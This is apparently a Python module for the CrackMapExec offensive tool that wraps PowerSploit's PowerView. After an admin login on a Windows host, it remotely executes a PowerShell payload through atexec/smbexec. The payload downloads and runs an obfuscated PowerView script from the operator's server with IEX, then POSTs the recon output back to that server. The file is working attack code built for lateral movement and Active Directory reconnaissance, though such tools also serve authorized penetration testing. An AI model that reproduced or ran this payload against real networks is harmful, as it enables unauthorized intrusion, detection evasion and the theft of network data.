from cme.helpers import create_ps_command, obfs_ps_script, get_ps_script, write_log
from StringIO import StringIO
from datetime import datetime
from sys import exit

class CMEModule:
    '''
        Wrapper for PowerView's functions
        Module by @byt3bl33d3r
    '''

    name = 'powerview'

    description = "Wrapper for PowerView's functions"

    def options(self, context, module_options):
        '''
            COMMAND  Powerview command to run
        '''

        self.command = None
        if not 'COMMAND' in module_options:
            context.log.error('COMMAND option is required!')
            exit(1)

        if 'COMMAND' in module_options:
            self.command = module_options['COMMAND']

    def on_admin_login(self, context, connection):

        powah_command = self.command + ' | Out-String'

        payload = '''
        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/PowerView.ps1');
        $data = {command}
        $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
        $request.Method = 'POST';
        $request.ContentType = 'application/x-www-form-urlencoded';
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($data);
        $request.ContentLength = $bytes.Length;
        $requestStream = $request.GetRequestStream();
        $requestStream.Write( $bytes, 0, $bytes.Length );
        $requestStream.Close();
        $request.GetResponse();'''.format(server=context.server,
                                          port=context.server_port,
                                          addr=context.localip,
                                          command=powah_command)

        context.log.debug('Payload: {}'.format(payload))
        payload = create_ps_command(payload)
        connection.execute(payload, methods=['atexec', 'smbexec'])
        context.log.success('Executed payload')

    def on_request(self, context, request, launcher, payload):
        if 'PowerView.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            with open(get_ps_script('PowerSploit/Recon/PowerView.ps1'), 'r') as ps_script:
                ps_script = obfs_ps_script(ps_script.read())
                request.wfile.write(ps_script)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)

        #We've received the response, stop tracking this host
        response.stop_tracking_host()

        if len(data):
            def print_post_data(data):
                buf = StringIO(data.strip()).readlines()
                for line in buf:
                    context.log.highlight(line.strip())

            print_post_data(data)

            log_name = 'PowerView-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
            write_log(data, log_name)
            context.log.info("Saved output to {}".format(log_name))
